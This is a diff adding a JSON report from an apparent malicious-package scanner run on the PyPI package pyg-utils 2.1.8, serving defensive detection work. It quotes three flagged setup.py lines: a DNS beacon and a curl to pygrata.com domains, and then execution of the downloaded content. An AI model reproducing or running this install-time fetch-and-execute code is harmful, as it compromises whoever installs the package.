@@ -1,0 +1,34 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:14",
+                "code": "    subprocess.getoutput('dig @1.1.1.1 installpygc.api.pygrata.com')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:15",
+                "code": "    banner = subprocess.getoutput('curl http://graphs.pygrata.com/pyg.html')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:16",
+                "code": "    subprocess.getoutput(str(banner))\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/pyg-utils-2.1.8"
+}
